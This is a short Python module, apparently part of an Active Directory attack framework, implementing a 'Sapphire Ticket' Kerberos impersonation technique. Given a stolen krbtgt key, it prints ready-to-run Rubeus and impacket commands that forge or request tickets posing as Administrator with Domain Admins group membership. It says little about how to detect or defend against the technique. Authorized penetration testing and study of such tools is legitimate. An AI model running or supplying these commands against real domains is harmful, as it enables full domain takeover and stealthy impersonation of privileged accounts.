"""Sapphire Ticket — S4U2Self+U2U PAC swap for stealthy impersonation."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.attack.sapphire_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    impersonate = getattr(args, "impersonate", "Administrator")
    dc_ip = getattr(args, "dc_ip", None)

    print("[*] Sapphire Ticket: S4U2Self + U2U PAC modification")
    print("[*] Domain: {}  Impersonate: {}".format(cred.domain, impersonate))
    print("[*] Most stealthy ticket — uses real PAC from legitimate TGT")

    if not krbtgt_hash:
        print("[!] --krbtgt-hash required (AES256 key for best OPSEC)")
        return 1

    print("\n[*] Rubeus command:")
    print("  Rubeus.exe diamond /krbkey:{} /tgtdeleg /enctype:aes256 /ticketuser:{} /ticketuserid:500 /groups:512".format(
        krbtgt_hash, impersonate))
    print("\n[*] impacket (getST + ticket modification):")
    print("  getST.py -spn cifs/{} -impersonate {} {}/{}".format(
        dc_ip or "DC01", impersonate, cred.domain, cred.username or "user"))

    return 0
